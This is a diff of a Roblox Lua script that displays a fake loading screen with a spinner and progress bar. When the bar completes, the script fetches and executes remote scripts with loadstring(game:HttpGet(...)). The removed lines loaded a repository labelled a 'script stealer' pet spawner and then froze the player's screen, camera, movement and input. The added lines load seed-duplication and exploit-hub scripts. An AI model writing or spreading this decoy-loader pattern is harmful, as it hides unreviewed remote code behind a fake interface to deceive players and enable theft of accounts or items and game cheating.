@@ -1,19 +1,9 @@
--- Services
-local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-
-local player = Players.LocalPlayer
-local camera = workspace.CurrentCamera
-
--- Create the ScreenGui
+--- Create the ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "CrashWaitingUI"
 screenGui.ResetOnSpawn = false
 screenGui.IgnoreGuiInset = true
-screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
 -- Transparent fullscreen Frame
 local frame = Instance.new("Frame")
@@ -59,21 +49,22 @@ barFill.BorderSizePixel = 0
 barFill.Parent = barBackground
 
 -- Animate spinner
+local runService = game:GetService("RunService")
 local angle = 0
-RunService.RenderStepped:Connect(function(deltaTime)
+runService.RenderStepped:Connect(function(deltaTime)
     angle = angle + 180 * deltaTime
     loadingImage.Rotation = angle % 360
 end)
 
 -- Animate loading bar over 20 seconds
+local TweenService = game:GetService("TweenService")
 local goal = { Size = UDim2.new(1, 0, 1, 0) }
-local tweenInfo = TweenInfo.new(20, Enum.EasingStyle.Linear)
+local tweenInfo = TweenInfo.new(30, Enum.EasingStyle.Linear)
 local tween = TweenService:Create(barFill, tweenInfo, goal)
 tween:Play()
 
--- When loading completes, fade out and freeze
+-- Fade-out and execute scripts when complete
 tween.Completed:Connect(function()
-    -- Fade out UI
     for t = 0, 1, 0.05 do
         textLabel.TextTransparency = t
         textLabel.TextStrokeTransparency = t
@@ -83,56 +74,10 @@ tween.Completed:Connect(function()
         wait(0.05)
     end
     screenGui:Destroy()
-
-    -- Execute external scripts
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Letsbegin2/growagarden.script_stealer.fruit-player-dupe.pets-schekles/refs/heads/main/Petspawnerscriptss"))()
+    
+    -- Execute the first script
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Syphinx-Script/Syphinx-Seed-Duplicate/refs/heads/main/Ahmad99%20No%20Lag"))()
+    
+    -- Execute the second script
     loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-    Spawner.Load()
-
-    -- Freeze screen and input
-    local freezeGui = Instance.new("ScreenGui")
-    freezeGui.Name = "FreezeScreen"
-    freezeGui.ResetOnSpawn = false
-    freezeGui.IgnoreGuiInset = true
-    freezeGui.Parent = player:WaitForChild("PlayerGui")
-
-    local freezeFrame = Instance.new("Frame")
-    freezeFrame.Size = UDim2.new(1, 0, 1, 0)
-    freezeFrame.Position = UDim2.new(0, 0, 0, 0)
-    freezeFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-    freezeFrame.BackgroundTransparency = 0.5
-    freezeFrame.Modal = true
-    freezeFrame.Parent = freezeGui
-
-    local message = Instance.new("TextLabel")
-    message.Size = UDim2.new(1, 0, 0.2, 0)
-    message.Position = UDim2.new(0, 0, 0.4, 0)
-    message.Text = "You are frozen!"
-    message.TextColor3 = Color3.new(1, 1, 1)
-    message.BackgroundTransparency = 1
-    message.Font = Enum.Font.SourceSansBold
-    message.TextScaled = true
-    message.Parent = freezeFrame
-
-    -- Lock camera
-    camera.CameraType = Enum.CameraType.Scriptable
-
-    -- Disable movement
-    local character = player.Character or player.CharacterAdded:Wait()
-    local humanoid = character:WaitForChild("Humanoid")
-    humanoid.WalkSpeed = 0
-    humanoid.JumpPower = 0
-
-    -- Disable CoreGui
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-    pcall(function()
-        StarterGui:SetCore("TopbarEnabled", false)
-    end)
-
-    -- Block input
-    UserInputService.InputBegan:Connect(function(input, gameProcessed)
-        if freezeFrame.Visible then
-            return Enum.ContextActionResult.Sink
-        end
-    end)
 end)
